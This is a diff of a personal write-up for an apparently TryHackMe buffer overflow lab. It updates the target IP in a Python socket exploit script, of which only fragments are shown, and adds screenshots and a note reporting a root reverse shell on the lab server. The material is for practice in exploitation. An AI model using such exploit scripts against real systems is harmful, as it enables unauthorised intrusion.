@@ -696,7 +696,7 @@ except:
      
     - Also change the python script to pint the RHOST & RPORT of the OSCP Server (THM machine) 
     
-        - ip = "10.10.91.192"
+        - ip = "10.10.25.92"
         - port = 1337 
 
 - **Final Script:**
@@ -706,7 +706,7 @@ except:
 ```python
 import socket
 
-ip = "10.10.91.192"
+ip = "10.10.25.92"
 port = 1337
 
 prefix = "OVERFLOW1 "
@@ -753,6 +753,17 @@ except:
   print("Could not connect.")
 ```
 
+- ![image](https://user-images.githubusercontent.com/94720207/169681685-8128ef23-351c-4612-a5d5-a44b558d1627.png)
+
+- The final victory (manually start the OSCP Server from the THM Machine!!! remember you are in you bare metal dude!):
+
+    - ![image](https://user-images.githubusercontent.com/94720207/169681873-7bb49b71-d1ed-4391-838c-c901c2f7fdbb.png)
+
+- Executing script:
+
+    - ![image](https://user-images.githubusercontent.com/94720207/169681957-eeddd076-a653-453c-8f94-e35b3b6b4508.png)
+
+- **Reverse shell with root privileges gained from OSCP Server!!! It's done! :D** 
 
 ---
 
